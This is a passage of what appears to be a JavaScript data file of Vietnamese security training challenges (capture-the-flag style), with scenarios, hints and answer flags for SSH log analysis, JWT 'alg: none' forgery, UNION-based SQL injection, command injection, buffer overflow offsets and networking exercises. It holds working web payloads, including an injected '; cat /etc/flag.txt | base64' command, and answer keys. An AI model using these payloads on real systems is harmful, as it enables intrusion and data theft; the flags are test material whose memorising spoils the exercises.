(Ví dụ mẫu cú pháp: FLAG{txid_0x12ab_ip_1.2.3.4})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Wireshark DNS filter</b>: <code>dns.flags.response == 1 && dns.id</code>.<br>
            • <b>Dig CLI</b>: <code>dig @resolver vietbank.vn +trace</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Tìm trường <code>Transaction ID</code> trong gói tin Response giả mạo đã khớp với TXID của truy vấn ban đầu.<br>
            2. Trong phần <code>Additional records</code>, tìm bản ghi loại A gán địa chỉ IP độc hại cho tên miền <code>vietbank.vn</code>.<br>
            3. Ghép nối 2 thông tin theo đúng cú pháp cờ yêu cầu.
        </div>
    </div>
</div>`,
                flag: "FLAG{txid_0x9c4e_ip_194.26.29.88}"
            },

            // =========================================================================
            // DOMAIN 6: VÙNG TRUY NHẬP TỪ XA (REMOTE ACCESS DOMAIN)
            // =========================================================================
            {
                id: 11,
                domain: "remote-access",
                domainVi: "6. Vùng Truy Nhập Từ Xa (Remote Access Domain)",
                title: "Thử Thách 11: Nhật Ký Tấn Công Mật Khẩu SSH Bằng THChydra",
                category: "Tấn Công Mật Khẩu (Password Spraying / Brute-force)",
                difficulty: "Trung bình",
                points: 150,
                description: "Máy chủ SSH nội bộ mở cổng 22 ra ngoài Internet để nhân viên làm việc từ xa (Work From Home). Kẻ tấn công sử dụng công cụ Hydra thực hiện cuộc tấn công rải mật khẩu (Password Spraying) với mật khẩu phổ biến 'Welcome@2026' nhằm tránh kích hoạt cơ chế khóa tài khoản. Hãy phân tích file nhật ký xác thực /var/log/auth.log để tìm tài khoản nhân viên duy nhất bị bẻ khóa và địa chỉ IP của kẻ tấn công!",
                codeSnippet: `Nov 20 02:45:01 srv-ssh sshd[4102]: Failed password for invalid user admin from 198.51.100.142 port 48102 ssh2
Nov 20 02:45:03 srv-ssh sshd[4105]: Failed password for user it_helpdesk from 198.51.100.142 port 48104 ssh2
Nov 20 02:45:06 srv-ssh sshd[4108]: Failed password for user accountant from 198.51.100.142 port 48106 ssh2
Nov 20 02:45:09 srv-ssh sshd[4111]: Failed password for user sysadmin from 198.51.100.142 port 48108 ssh2
Nov 20 02:45:12 srv-ssh sshd[4115]: Accepted password for user remote_devops from 198.51.100.142 port 48110 ssh2
Nov 20 02:45:13 srv-ssh sshd[4115]: pam_unix(sshd:session): session opened for user remote_devops by (uid=0)
Nov 20 02:45:16 srv-ssh sshd[4120]: Failed password for user tester from 198.51.100.142 port 48112 ssh2

---
YÊU CẦU:
Kiểm toán nhật ký xác thực trên để xác định:
1. Tên tài khoản người dùng duy nhất bị đăng nhập thành công
2. Địa chỉ IP của kẻ tấn công đang thực hiện Password Spraying
Cú pháp cờ: FLAG{user_<tên_user>_ip_<IP_Attacker>}
(Ví dụ mẫu cú pháp: FLAG{user_john_ip_10.20.30.40})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Linux CLI</b>: <code>grep "Accepted" /var/log/auth.log</code>.<br>
            • <b>Fail2ban</b>: Công cụ phòng chống tấn công brute-force SSH.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Cuộc tấn công Password Spraying tạo ra rất nhiều dòng log <code>Failed password</code>.<br>
            2. Tìm dòng duy nhất ghi nhận đăng nhập thành công với từ khóa <code>Accepted password for user ... from ...</code>.<br>
            3. Trích xuất chính xác username và IP nguồn của kẻ tấn công.
        </div>
    </div>
</div>`,
                flag: "FLAG{user_remote_devops_ip_198.51.100.142}"
            },
            {
                id: 12,
                domain: "remote-access",
                domainVi: "6. Vùng Truy Nhập Từ Xa (Remote Access Domain)",
                title: "Thử Thách 12: Chiếm Đoạt Phiên JWT Lỗ Hổng Thuật Toán 'alg': 'none'",
                category: "Chiếm Đoạt Phiên (Session Hijacking / JWT)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Cổng truy nhập từ xa SSL-VPN sử dụng JSON Web Token (JWT) trong Cookie để duy trì phiên làm việc của nhân viên. Bạn đăng nhập với tài khoản khách (role: guest). Máy chủ phía backend sử dụng thư viện JWT chưa vá lỗi kiểm tra chữ ký khi thuật toán đặt là 'none'. Hãy tạo token giả mạo với quyền quản trị viên tối cao role: admin!",
                codeSnippet: `=== RAW JWT TOKEN NHẬN ĐƯỢC TỪ COOKIE ===
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoia2hhY2hoYW5nIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTQ4NDAwMDB9.i_DcxLgU-3N9S_01Yp69GZJmQOq8Q0rK9uO1r-8Lh3M

---
YÊU CẦU:
Máy chủ VPN bị lỗ hổng chấp nhận thuật toán "none" (CVE-2015-9235).
1. Giải mã token trên để kiểm tra cấu trúc Header và Payload.
2. Giả mạo Header mới với thuật toán "none" (chữ thường): {"alg":"none","typ":"JWT"}
3. Giả mạo Payload mới nâng quyền hạn: {"user":"administrator","role":"admin","iat":1794840000}
4. Mã hóa Base64URL Header và Payload mới, ghép lại theo chuẩn JWT (Header.Payload.) với phần chữ ký để trống (kết thúc bằng dấu chấm .).

Cú pháp cờ: Nộp toàn bộ chuỗi JWT giả mạo kết thúc bằng dấu chấm:
FLAG{<jwt_token_bỏ_chữ_ký>}
(Gợi ý: Header {"alg":"none","typ":"JWT"} mã hóa Base64URL là: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0)`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>jwt.io Debugger</b>: Phân tích và chỉnh sửa token trực quan.<br>
            • <b>NETLAB Terminal</b>: Lệnh <code>b64 encode &lt;chuỗi_json&gt;</code>.<br>
            • <b>CyberChef</b>: Recipe <code>To Base64URL</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Mã hóa Base64URL chuỗi Payload: <code>{"user":"administrator","role":"admin","iat":1794840000}</code>.<br>
            2. Ghép với Header đã cho: <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.&lt;Base64URL_Payload&gt;.</code>.<br>
            3. Lưu ý token JWT khi bỏ chữ ký vẫn bắt buộc phải có dấu chấm <code>.</code> ở cuối cùng.
        </div>
    </div>
</div>`,
                flag: "FLAG{eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW5pc3RyYXRvciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDg0MDAwMH0.}"
            },

            // =========================================================================
            // DOMAIN 7: VÙNG HỆ THỐNG & ỨNG DỤNG (SYSTEM & APPLICATION DOMAIN)
            // =========================================================================
            {
                id: 13,
                domain: "system-app",
                domainVi: "7. Vùng Hệ Thống & Ứng Dụng (System & App Domain)",
                title: "Thử Thách 13: Khai Thác SQL Injection UNION-Based Trích Xuất Dữ Liệu",
                category: "Tấn Công Ứng Dụng Web (SQL Injection / Data Exfiltration)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Ứng dụng web Cổng thông tin doanh nghiệp nội bộ có tham số tìm kiếm nhân sự profile.php?id=1 dính lỗi SQL Injection do nối chuỗi thô. Kẻ tấn công sử dụng kỹ thuật UNION-Based để nối bảng admin_users và trích xuất chuỗi mã băm mật khẩu MD5 của tài khoản root_admin. Hãy crack hash để tìm mật khẩu cờ dạng rõ!",
                codeSnippet: `-- Pentester khai thác lỗ hổng UNION SELECT trên cổng thông tin nội bộ:
GET /profile.php?id=-1' UNION SELECT 1, group_concat(username, 0x3a, pass_hash), 3 FROM admin_users-- - HTTP/1.1
Host: secure-portal.internal

-- Dữ liệu hiển thị trích xuất trên giao diện web:
[DB_DUMP_OUTPUT]:
root_admin:482c811da5d5b4bc6d497ffa98491e38

---
YÊU CẦU:
1. Xác định mật khẩu gốc dạng rõ (plaintext) sau khi giải mã chuỗi băm MD5 32 ký tự hex:
   482c811da5d5b4bc6d497ffa98491e38
Cú pháp cờ: FLAG{<mật_khẩu_admin_sau_khi_crack>}
(Ví dụ mẫu cú pháp: FLAG{admin123})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>CrackStation.net</b>: Cơ sở dữ liệu rainbow table tra cứu hash trực tuyến miễn phí.<br>
            • <b>Hashcat / John the Ripper</b>: <code>hashcat -m 0 hash.txt rockyou.txt</code>.<br>
            • <b>CyberChef</b>: Recipe Hash / Checksum.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Chuỗi 32 ký tự hex <code>482c811da5d5b4bc6d497ffa98491e38</code> là hàm băm MD5 chuẩn.<br>
            2. Hãy dùng CrackStation hoặc tìm kiếm chuỗi băm này trên các bộ từ điển phổ biến để tìm ra từ khóa mật khẩu gốc.
        </div>
    </div>
</div>`,
                flag: "FLAG{password123}"
            },
            {
                id: 14,
                domain: "system-app",
                domainVi: "7. Vùng Hệ Thống & Ứng Dụng (System & App Domain)",
                title: "Thử Thách 14: Thực Thi Mã Từ Xa RCE Qua Lỗ Hổng Command Injection",
                category: "Tấn Công Ứng Dụng Web (Command Injection / RCE)",
                difficulty: "Nâng cao",
                points: 250,
                description: "Trang quản trị Router nội bộ có tính năng 'Network Diagnostic Ping' cho phép kiểm tra độ trễ mạng nhưng lập trình viên sử dụng trực tiếp hàm shell mà không lọc ký tự đặc biệt. Kẻ tấn công sử dụng toán tử phân tách lệnh ';' để đọc file cờ bí mật /etc/flag.txt được mã hóa Base64. Hãy phân tích phản hồi HTTP để lấy cờ!",
                codeSnippet: `POST /tools/ping.php HTTP/1.1
Host: edge-router.internal.net
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%3B+cat+%2Fetc%2Fflag.txt+%7C+base64

--- HTTP/1.1 200 OK ---
Content-Type: text/plain

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss

[COMMAND OUTPUT]:
UkNFX3NlbWljb2xvbl9jb21tYW5kX2luamVjdGlvbl9wYXNzd29yZF9leGZpbA==

---
YÊU CẦU:
Kẻ tấn công đã chèn lệnh '; cat /etc/flag.txt | base64' để đọc file cờ và mã hóa Base64 kết quả trả về.
Hãy giải mã chuỗi Base64 trên để lấy cờ bí mật.
Cú pháp cờ: FLAG{<kết_quả_sau_khi_decode_base64>}
(Ví dụ: nếu chuỗi decode ra abc thì nộp FLAG{abc})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>NETLAB Virtual Terminal</b>: Lệnh <code>b64 decode &lt;chuỗi&gt;</code>.<br>
            • <b>CyberChef</b>: Recipe <code>From Base64</code>.<br>
            • <b>Linux/macOS CLI</b>: <code>echo "..." | base64 -d</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Dấu chấm phẩy <code>;</code> cho phép thực thi lệnh thứ hai ngay sau khi lệnh ping kết thúc.<br>
            2. Kết quả của file <code>/etc/flag.txt</code> được chuyển tiếp qua lệnh <code>base64</code> và in ra ở phần Command Output.<br>
            3. Giải mã chuỗi Base64 đó ra văn bản rõ để lấy nội dung cờ.
        </div>
    </div>
</div>`,
                flag: "FLAG{RCE_semicolon_command_injection_password_exfil}"
            },
            {
                id: 15,
                domain: "system-app",
                domainVi: "7. Vùng Hệ Thống & Ứng Dụng (System & App Domain)",
                title: "Thử Thách 15: Tính Toán Offset Tràn Bộ Đệm Ngăn Xếp (Stack Buffer Overflow)",
                category: "Lỗi Bộ Nhớ & Khai Thác Nhị Phân (Buffer Overflow / Exploit)",
                difficulty: "Chuyên gia",
                points: 300,
                description: "Một dịch vụ nhị phân C 32-bit x86 chạy trên Linux sử dụng hàm không an toàn strcpy(dest, src) với bộ đệm 64 bytes. Khi gửi chuỗi mẫu De Bruijn cyclic pattern 100 ký tự sinh bởi Metasploit, chương trình bị crash tại thanh ghi con trỏ lệnh EIP có giá trị 0x41326441 (ASCII: 'Ad2A'). Hãy tính toán offset chính xác và xác định địa chỉ hàm get_secret_flag() để hoàn tất payload khai thác!",
                codeSnippet: `$ gdb -q ./vuln_server
Reading symbols from ./vuln_server...
(gdb) run < cyclic_pattern_100.txt
Program received signal SIGSEGV, Segmentation fault.
0x41326441 in ?? ()

(gdb) info registers
eax            0x0                 0
ebp            0x41316441          0x41316441
esp            0xffffd080          0xffffd080
eip            0x41326441          0x41326441  <-- [CRASH AT EIP]

(gdb) print get_secret_flag
$1 = {void ()} 0x080485d6 <get_secret_flag>

---
YÊU CẦU:
1. Giá trị thanh ghi EIP lúc crash là 0x41326441 (ký tự ASCII: 'Ad2A').
   Sử dụng công cụ tính offset pattern (như msf-pattern_offset) để tìm số byte đệm (offset) chính xác làm tràn đến EIP.
2. Địa chỉ hàm mục tiêu 'get_secret_flag' để ghi đè vào EIP.
Cú pháp cờ: FLAG{offset_<số_byte>_ret_<địa_chỉ_hàm>}
(Ví dụ mẫu cú pháp: FLAG{offset_64_ret_0x08048123})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Metasploit Pattern Tools</b>: <code>msf-pattern_offset -q 0x41326441</code>.<br>
            • <b>GDB PEDA / GEF / pwndbg</b>: <code>pattern offset 0x41326441</code>.<br>
            • <b>Pwntools (Python)</b>: <code>cyclic_find(0x41326441)</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Giá trị <code>0x41326441</code> tương ứng với 4 byte chuỗi ASCII "Ad2A" trong cyclic pattern.<br>
            2. Vị trí offset của chuỗi này nằm trong khoảng hơn 64 bytes (khoảng 7x bytes).<br>
            3. Địa chỉ của hàm mục tiêu <code>get_secret_flag</code> được hiển thị trong output của lệnh <code>print get_secret_flag</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{offset_72_ret_0x080485d6}"
            },

            // =========================================================================
            // DOMAIN 8: GIAO THỨC MẠNG & CCNA (NETWORKING PROTOCOLS & ROUTING)
            // =========================================================================
            {
                id: 16,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 16: Wireshark Packet Forensics (Điều Tra Bắt Gói Tin Telnet)",
                category: "Phân Tích Giao Thức",
                difficulty: "Dễ",
                points: 100,
                description: "Hệ thống IDS phát hiện một nhân viên truy cập máy chủ quản trị bằng giao thức không mã hóa qua mạng nội bộ. Hãy phân tích đoạn trích xuất gói tin Ethernet/IP/TCP bắt được bên dưới để tìm mật khẩu cờ bí mật!",
                codeSnippet: `--- FRAME 42: TCP Packet Dump on Port 23 (Telnet) ---
0000   00 50 56 c0 00 08 00 0c 29 3e 51 4a 08 00 45 00
0010   00 48 a1 b2 40 00 40 06 7c d4 c0 a8 01 0a c0 a8
0020   01 01 04 23 00 17 6f 12 8a 44 2e 84 9b 12 50 18
0030   10 00 e3 9d 00 00 50 41 53 53 20 54 65 6c 6e 65
0040   74 5f 50 61 73 73 77 6f 72 64 5f 55 6e 65 6e 63
0050   72 79 70 74 65 64 5f 56 75 6c 6e 0d 0a

---
YÊU CẦU:
1. Giao thức Telnet (cổng 23) truyền dữ liệu ở dạng văn bản thuần (Cleartext) trong phần payload của TCP.
2. Dữ liệu bắt đầu từ byte thứ 36 (offset 0036 hex: 50 41 53 53 20 ... tức 'PASS ').
3. Hãy giải mã các byte Hex từ sau chữ 'PASS ' cho đến trước ký tự xuống dòng 0d 0a sang ký tự ASCII để tìm mật khẩu.
Cú pháp cờ: FLAG{<mật_khẩu_telnet_sau_khi_dịch_hex>}
(Ví dụ mẫu cú pháp: FLAG{MySecretPassword})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>CyberChef</b>: Recipe <code>From Hex (Delimiter: Auto/Space)</code>.<br>
            • <b>Python CLI</b>: <code>bytes.fromhex("54 65 6c...").decode("ascii")</code>.<br>
            • Bảng tra mã ASCII chuẩn (Hex to Char).
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Các byte <code>50 41 53 53 20</code> tương ứng với từ khóa <code>PASS </code>.<br>
            2. Các byte tiếp theo từ offset <code>003b</code>: <code>54 65 6c 6e 65 74...</code> tương ứng với chữ cái mở đầu là "T", "e", "l", "n", "e", "t"...<br>
            3. Dịch trọn vẹn chuỗi hex này sang ASCII cho đến trước byte kết thúc <code>0d 0a</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{Telnet_Password_Unencrypted_Vuln}"
            },
            {
                id: 17,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 17: Subnetting Broadcast Gate (Bẻ Khóa Mạng Con Ngầm)",
                category: "Tính Toán Mạng Con",
                difficulty: "Trung bình",
                points: 150,
                description: "Máy chủ bảo mật của bạn đang ở chế độ ngủ (Standby) tại địa chỉ IP: 172.28.140.219/21. Để đánh thức máy chủ bằng gói tin Wake-on-LAN qua Router, bạn phải tính toán chính xác địa chỉ Directed Broadcast IP của mạng con này!",
                codeSnippet: `Target Host IP: 172.28.140.219
Prefix: /21

---
YÊU CẦU:
Tính toán địa chỉ Directed Broadcast IP chính xác của mạng con chứa host trên.
Cú pháp cờ: FLAG{<Broadcast_IP>}
(Ví dụ: FLAG{172.28.0.255})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>ipcalc CLI</b>: <code>ipcalc 172.28.140.219/21</code>.<br>
            • <b>Python ipaddress</b>: <code>ipaddress.IPv4Network("172.28.140.219/21", strict=False)</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. /21 có Subnet Mask 255.255.248.0 (21 bit 1, 11 bit 0).<br>
            2. Bước nhảy ở octet 3 là: 256 - 248 = 8.<br>
            3. Tìm địa chỉ mạng của octet 3: lấy 140 chia cho 8 lấy phần nguyên nhân lại với 8. Sau đó cộng thêm 8 - 1 để tìm giá trị Broadcast ở octet 3. Octet cuối cùng luôn là 255.
        </div>
    </div>
</div>`,
                flag: "FLAG{172.28.143.255}"
            },
            {
                id: 18,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 18: Cisco Firewall ACL Bypass (Xuyên Thủng Tường Lửa)",
                category: "Bảo Mật Tường Lửa",
                difficulty: "Trung bình",
                points: 150,
                description: "Tường lửa Cisco ASA được cấu hình bộ quy tắc Extended ACL sau đây để bảo vệ máy chủ Web tài chính 10.20.30.40. Cổng dịch vụ TCP bảo mật nào được phép truyền dữ liệu qua tường lửa mà không bị lệnh Implicit Deny chặn lại?",
                codeSnippet: `Router# show access-lists 105
Extended IP access list 105
    10 permit tcp any host 10.20.30.40 eq 443
    20 permit udp any host 10.20.30.40 eq 53
    30 deny ip any any (implicit default)

---
YÊU CẦU:
Nhập số hiệu cổng TCP được phép đi qua tường lửa vào cấu trúc cờ:
Cú pháp cờ: FLAG{tcp_port_<số_cổng>_https}
(Ví dụ: FLAG{tcp_port_80_https})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Cisco IOS CLI</b>: Tra cứu cú pháp <code>access-list &lt;number&gt; permit tcp ... eq &lt;port&gt;</code>.<br>
            • Danh mục cổng mạng chuẩn IANA (Port Numbers).
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Xem dòng lệnh số 10: Quy tắc chỉ rõ giao thức TCP và từ khóa <code>eq</code> kèm số cổng chuẩn của HTTPS.<br>
            2. Điền số hiệu cổng này vào vị trí placeholder trong cú pháp cờ.
        </div>
    </div>
</div>`,
                flag: "FLAG{tcp_port_443_https}"
            },
            {
                id: 19,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 19: OSPF Metric Shortest Path (Tối Ưu Tuyến Đường OSPF)",
                category: "Định Tuyến Động",
                difficulty: "Trung bình",
                points: 200,
                description: "Một gói tin dữ liệu cần đi từ Router A đến Router D qua mạng OSPF. Công thức Cost = 100 Mbps / Bandwidth. Tuyến A -> B -> D có băng thông A-B là 100 Mbps (Cost 1) và B-D là 10 Mbps (Cost 10). Tuyến A -> C -> D có băng thông A-C là 1 Gbps (Cost 1) và C-D là 1 Gbps (Cost 1). Tổng Cost của tuyến đường tối ưu được OSPF lựa chọn là bao nhiêu?",
                codeSnippet: `Băng thông tham chiếu chuẩn OSPF: Reference Bandwidth = 100 Mbps.
Công thức tính chi phí đường truyền OSPF: Cost = 100 Mbps / Bandwidth.
(Lưu ý: Nếu Bandwidth >= 100 Mbps, Cost tối thiểu là 1).

Gói tin cần đi từ Router A đến Router D:
- Tuyến 1 (A -> B -> D):
  + Đoạn A-B: Băng thông 100 Mbps
  + Đoạn B-D: Băng thông 10 Mbps (Cost = 100 / 10 = 10)
- Tuyến 2 (A -> C -> D):
  + Đoạn A-C: Băng thông 1 Gbps (Cost = 1)
  + Đoạn C-D: Băng thông 1 Gbps (Cost = 1)

---
YÊU CẦU:
Tính tổng chi phí Metric của tuyến đường ngắn nhất mà OSPF lựa chọn và nhập theo định dạng:
Cú pháp cờ: FLAG{cost_<tổng_cost>_path_<tên_tuyến>}
(Ví dụ: nếu tuyến ABD có cost 11 thì nộp: FLAG{cost_11_path_abd})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Cisco IOS CLI</b>: <code>show ip ospf database</code>, <code>show ip route ospf</code>.<br>
            • Thuật toán Dijkstra SPF (Shortest Path First).
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. OSPF luôn chọn tuyến đường có tổng Cost nhỏ nhất.<br>
            2. Cộng chi phí của từng chặng trong Tuyến 1 và Tuyến 2.<br>
            3. So sánh 2 kết quả và chọn tuyến đường tối ưu để điền tên tuyến (chữ thường) và tổng chi phí vào cờ.
        </div>
    </div>
</div>`,
                flag: "FLAG{cost_2_path_acd}"
            },
            {
                id: 20,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 20: Rogue DHCP Server Hunt (Truy Lùng Máy Chủ DHCP Giả Mạo)",
                category: "Phân Tích Tấn Công",
                difficulty: "Nâng cao",
                points: 200,
                description: "Người dùng trong văn phòng phàn nàn bị cấp sai Default Gateway. Bật tính năng DHCP Snooping trên Switch phát hiện bảng log sau. Hãy tìm ra địa chỉ MAC của thiết bị giả mạo gắn vào cổng Untrusted!",
                codeSnippet: `Switch# show ip dhcp snooping binding
MacAddress          IpAddress        Lease(sec)  Type            VLAN  Interface
------------------  ---------------  ----------  --------------  ----  -----------------
00:1A:2B:3C:4D:5E   192.168.1.100    86400       dhcp-snooping   10    GigabitEthernet0/1 [TRUSTED]
F4:0F:24:99:AA:BB   192.168.1.254    86400       dhcp-snooping   10    FastEthernet0/24   [UNTRUSTED_ALERT]
00:14:22:AA:BB:CC   192.168.1.105    86400       dhcp-snooping   10    GigabitEthernet0/2 [TRUSTED]

---
YÊU CẦU:
Tìm địa chỉ MAC của thiết bị giả mạo máy chủ DHCP gắn vào cổng không tin cậy (Untrusted).
Cú pháp cờ: FLAG{<MAC_ADDRESS>}
(Ví dụ mẫu cú pháp: FLAG{00:11:22:33:44:55})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Cisco Switch CLI</b>: <code>show ip dhcp snooping binding</code>.<br>
            • <b>Wireshark Filter</b>: <code>bootp.option.dhcp == 2</code> (DHCP Offer).
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Cổng nào được cấu hình TRUSTED là cổng tin cậy nối tới máy chủ cấp phát hợp lệ.<br>
            2. Cổng nào mang nhãn UNTRUSTED_ALERT tự ý cấp IP gateway bất thường 192.168.1.254 chính là kẻ tấn công Rogue DHCP.<br>
            3. Trích xuất địa chỉ MAC ở dòng tương ứng.
        </div>
    </div>
</div>`,
                flag: "FLAG{F4:0F:24:99:AA:BB}"
            },
            {
                id: 21,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 21: TCP 3-Way Handshake Cracking (Bắt Tay 3 Bước TCP)",
                category: "Giao Thức Lớp 4",
                difficulty: "Nâng cao",
                points: 200,
                description: "Máy Client gửi gói tin SYN khởi tạo kết nối TCP đến Server với Initial Sequence Number (ISN) = 1000. Để hoàn thành bước thứ 2 trong quá trình bắt tay, Server phải phản hồi gói tin SYN-ACK với giá trị Acknowledgment Number (AckN) bằng bao nhiêu?",
